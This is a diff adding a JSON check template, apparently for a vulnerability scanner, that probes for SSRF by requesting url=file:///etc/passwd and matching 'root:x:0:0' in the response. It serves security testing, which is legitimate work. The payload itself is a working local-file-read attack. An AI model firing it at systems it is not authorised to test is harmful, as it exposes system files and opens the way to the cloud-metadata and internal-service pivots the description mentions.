@@ -1,0 +1,32 @@
+{
+  "name": "web/SSRF file-scheme local file read",
+  "description": "[high] Proves SSRF with URL-scheme control (CWE-918): the app fetches url=file:///etc/passwd and returns the file = attacker controls the scheme (leading to cloud-metadata and internal-service pivots). Keywords: ssrf file scheme local file read passwd url param fetch. ctrl: benign/blocked egress returns JSON error, not passwd content -> not falsified. probe_url = public SSRF vector endpoint (url param is fetched server-side).",
+  "cwe": "CWE-918",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{probe_url}}?url=file:///etc/passwd"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "root:x:0:0",
+      "present": true
+    }
+  ],
+  "params": [
+    "probe_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "57994b1becaf",
+  "created": "2026-11-05T19:30:06.502181+00:00",
+  "last_used": "2026-11-05T19:30:06.502181+00:00"
+}
